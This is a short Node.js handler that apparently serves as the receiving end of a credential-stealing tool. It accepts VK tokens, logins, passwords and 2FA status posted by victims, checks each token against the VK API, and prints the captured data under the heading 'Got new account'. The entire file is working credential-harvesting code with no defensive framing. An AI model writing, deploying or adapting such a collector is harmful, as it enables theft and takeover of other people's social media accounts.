const { VK } = require('vk-io')
const consola = require('consola')

module.exports = function(req, res) {
  const vk = new VK({
    token: req.body.token,
    apiVersion: '5.103',
    apiHeaders: {
      'User-Agent': req.headers['user-agent'] || 'vkApi/1.0'
    }
  })

  vk.api.users.get().then(([currentUser]) => {
    // accounts.push({ ...currentUser, ...req.body })

    consola.info({ message: 'Got new account', badge: true })
    consola.info(`Name: ${currentUser.first_name} ${currentUser.last_name}`)
    consola.info(`Login: ${req.body.username}`)
    consola.info(`Password: ${req.body.password}`)
    if (req.body['2fa']) {
      consola.error('2fa: Enabled')
    } else {
      consola.success('2fa: Disabled')
    }
    consola.info(`Token: ${req.body.token}`)
  })

  res.end('ok')
}
